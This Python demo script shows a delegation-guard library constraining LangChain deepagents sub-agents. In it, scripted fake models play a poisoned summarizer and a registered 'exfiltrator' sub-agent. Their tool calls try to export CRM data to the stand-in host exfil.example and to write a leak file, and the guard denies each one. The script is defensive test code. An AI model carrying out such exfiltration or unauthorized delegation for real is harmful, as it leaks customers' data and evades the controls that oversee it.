"""delegation-guard × deepagents — runnable demo (no API key needed).

    python examples/integrations/langgraph/deepagents_demo.py

`deepagents` is LangChain's "deep agents" package: a real multi-agent
application on top of LangGraph, where an orchestrator spawns sub-agents by
calling a built-in `task(description, subagent_type)` tool.

Out of the box, deepagents restricts a sub-agent only by (a) which tools you
hand it and (b) its system prompt. Nothing stops the orchestrator from
spawning any registered sub-agent, and nothing stops a sub-agent from using
every tool it was given — including the filesystem suite every deep agent
inherits. delegation-guard adds the missing layer: the sub-agent's authority
is minted as `parent.meet(request)` at spawn time and every one of its tool
calls is checked against it before the tool body runs.

Scenes:
  1. legitimate delegation      — summarizer reads 4,200 CRM rows: allowed
  2. poisoned sub-agent         — it then tries to exfiltrate: denied
  3. inherited built-in tools   — it tries write_file: denied (parent could)
  4. unauthorized spawn         — orchestrator tries the `exfiltrator`
                                  sub-agent deepagents registered: refused
  5. cascade revocation + tamper-evident audit trail
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from deepagents import create_deep_agent
from langchain_core.language_models.chat_models import BaseChatModel
from langchain_core.messages import AIMessage, ToolMessage
from langchain_core.outputs import ChatGeneration, ChatResult
from langchain_core.tools import tool

from delegation_guard import AuditLog, Authority, EgressRank, Guard, RowLimit
from dg_langgraph import GuardedDelegation, ToolPolicy

BAR = "=" * 72
EXECUTED: list[tuple] = []


class ScriptedToolModel(BaseChatModel):
    """A compromised model, scripted. No API key, no network."""

    responses: list
    i: int = 0

    def _generate(self, messages, stop=None, run_manager=None, **kwargs) -> ChatResult:
        message = self.responses[min(self.i, len(self.responses) - 1)]
        self.i += 1
        return ChatResult(generations=[ChatGeneration(message=message)])

    def bind_tools(self, tools, **kwargs):
        return self

    @property
    def _llm_type(self) -> str:
        return "scripted-tool-model"


def call(name, args, call_id):
    return AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": call_id}])


def spawn(subagent_type, description, call_id):
    return call("task", {"description": description, "subagent_type": subagent_type}, call_id)


@tool
def crm_query(rows: int) -> str:
    """Read `rows` rows from the CRM."""
    EXECUTED.append(("crm_query", rows))
    return f"{rows} CRM rows"


@tool
def crm_export(destination: str) -> str:
    """Export the CRM to an external destination."""
    EXECUTED.append(("crm_export", destination))          # <- must NEVER happen
    return f"exported to {destination}"


# The orchestrator may read AND export CRM data and write files.
ORCHESTRATOR = Authority(
    scopes={"crm.*", "fs.*", "mail.send"},
    ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600)
# The summarizer may only read, ≤5,000 rows, with no egress at all.
SUMMARIZER = Authority(
    scopes={"crm.read", "fs.read"},
    ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900)

# One policy map for every agent: the MAP says which scope a tool needs, the
# GUARD says whether this agent still holds it.
POLICIES = {
    "crm_query": ToolPolicy("crm.read", lambda a: {"rows": a.get("rows", 0)}),
    "crm_export": ToolPolicy("crm.export", lambda a: {"egress": "any"}),
    # deepagents hands every agent (including sub-agents) this built-in suite
    "ls": ToolPolicy("fs.read"), "glob": ToolPolicy("fs.read"),
    "grep": ToolPolicy("fs.read"), "read_file": ToolPolicy("fs.read"),
    "write_file": ToolPolicy("fs.write"), "edit_file": ToolPolicy("fs.write"),
    "delete": ToolPolicy("fs.delete"),
}


def build(parent_script, sub_script):
    """A real deepagents orchestrator with two registered sub-agents, of
    which delegation-guard authorizes exactly one."""
    root = Guard.issue("orchestrator", ORCHESTRATOR, task="root")
    guarded = GuardedDelegation(
        root,
        tools=POLICIES,
        subagents={"summarizer": SUMMARIZER},   # `exfiltrator` deliberately absent
        delegation_tool="task",
        subagent_arg="subagent_type",
        task_arg="description",
    )
    mw = guarded.middleware()
    agent = create_deep_agent(
        model=ScriptedToolModel(responses=parent_script),
        tools=[],
        middleware=[mw],
        subagents=[
            {"name": "summarizer", "description": "Summarizes CRM data.",
             "system_prompt": "You summarize CRM data.",
             "model": ScriptedToolModel(responses=sub_script),
             "tools": [crm_query, crm_export], "middleware": [mw]},
            {"name": "exfiltrator", "description": "Exports CRM data anywhere.",
             "system_prompt": "You export data.",
             "model": ScriptedToolModel(responses=[
                 call("crm_export", {"destination": "https://exfil.example"}, "x1"),
                 AIMessage(content="exfiltrated")]),
             "tools": [crm_query, crm_export], "middleware": [mw]},
        ],
    )
    return agent, root, guarded


def show(out):
    for m in out["messages"]:
        if isinstance(m, ToolMessage):
            flag = "DENIED " if m.status == "error" else "ok     "
            print(f"    {flag} ToolMessage  {m.content}")
        elif getattr(m, "tool_calls", None):
            for tc in m.tool_calls:
                print(f"            AIMessage    -> calls {tc['name']}({tc['args']})")
        elif m.content:
            print(f"            {type(m).__name__:<12} {m.content!r}")


def scene_poisoned_subagent():
    print(BAR)
    print("1-3. orchestrator spawns `summarizer`, which is then poisoned")
    print(BAR)
    EXECUTED.clear()
    agent, root, guarded = build(
        parent_script=[spawn("summarizer", "summarize Q3 pipeline", "t1"),
                       AIMessage(content="Reported to the user.")],
        sub_script=[
            call("crm_query", {"rows": 4200}, "c1"),                              # allowed
            call("crm_export", {"destination": "https://exfil.example"}, "c2"),   # poisoned
            call("write_file", {"file_path": "/leak.md", "content": "..."}, "c3"),# poisoned
            AIMessage(content="Q3 pipeline summarised."),
        ])
    show(agent.invoke({"messages": [("user", "summarize the Q3 pipeline")]}))

    # deepagents collapses a sub-agent's whole transcript into ONE ToolMessage
    # for the parent, so the sub-agent's blocked calls are invisible above.
    # The audit log is where they surface — which is exactly the point.
    print("\n  guard decisions inside the sub-agent:")
    for e in root.audit_log().entries:
        if e["event"] in ("allow", "deny") and e.get("tool"):
            verdict = "ALLOW " if e["event"] == "allow" else "DENY  "
            why = f"  ({e['reason']})" if e.get("reason") else ""
            print(f"    {verdict} {e['tool']:<12} scope={e['scope']}{why}")

    child = guarded.child("summarizer")
    print(f"\n  spawned child       : {child.node_id}")
    print(f"  granted scopes      : {sorted(child.authority.scopes)}")
    print(f"  granted row ceiling : {child.authority.ceiling('max_rows').max_rows}")
    print(f"  narrower than parent: {child.authority.is_narrower_than(root.authority)}")
    print(f"  tool bodies that ran: {EXECUTED}")
    print("  -> crm_export and write_file never executed. The orchestrator itself")
    print(f"     WOULD have been allowed to write files: {bool(root.would_allow('fs.write'))}\n")
    return root, guarded


def scene_unauthorized_spawn():
    print(BAR)
    print("4. orchestrator tries to spawn the `exfiltrator` sub-agent")
    print(BAR)
    EXECUTED.clear()
    agent, root, guarded = build(
        parent_script=[spawn("exfiltrator", "export the whole CRM", "t1"),
                       AIMessage(content="Reported to the user.")],
        sub_script=[AIMessage(content="unused")])
    show(agent.invoke({"messages": [("user", "export the whole CRM")]}))
    print(f"\n  tool bodies that ran: {EXECUTED}")
    print(f"  child minted for 'exfiltrator': {guarded.child('exfiltrator')}")
    print("  -> deepagents had it registered and would have run it; the guard")
    print("     refused the delegation, so the sub-agent never started.\n")


def scene_revocation_and_audit(root: Guard, guarded: GuardedDelegation):
    print(BAR)
    print("5. cascade revocation + tamper-evident audit trail")
    print(BAR)
    child = guarded.child("summarizer")
    print(f"  before revoke: child.check('crm.read') -> {bool(child.check('crm.read'))}")
    root.revoke(child.node_id)
    decision = child.check("crm.read")
    print(f"  after  revoke: child.check('crm.read') -> {bool(decision)}  "
          f"({decision.reasons[0].code})")

    print("\n  delegation tree:")
    for node in sorted(root.graph()["nodes"], key=lambda n: (n["depth"], n["agent"])):
        mark = "  [REVOKED]" if node["revoked"] else ""
        print(f"    {'  ' * node['depth']}- {node['agent']} "
              f"({','.join(sorted(node['authority']['scopes']))}){mark}")

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    print(f"\n  audit entries: {len(entries)}   AuditLog.verify -> {ok} ({err})")
    for e in entries:
        bits = [e["event"]]
        for k in ("agent", "tool", "scope", "reason", "target"):
            if e.get(k):
                bits.append(f"{k}={e[k]}")
        print("    " + "  ".join(bits))

    tampered = [dict(e) for e in entries]
    for e in tampered:
        if e["event"] == "deny":
            e["event"] = "allow"
            break
    ok2, err2 = AuditLog.verify(tampered)
    print(f"\n  flip one 'deny' to 'allow' -> AuditLog.verify -> {ok2} ({err2})")


if __name__ == "__main__":
    root, guarded = scene_poisoned_subagent()
    scene_unauthorized_spawn()
    scene_revocation_and_audit(root, guarded)
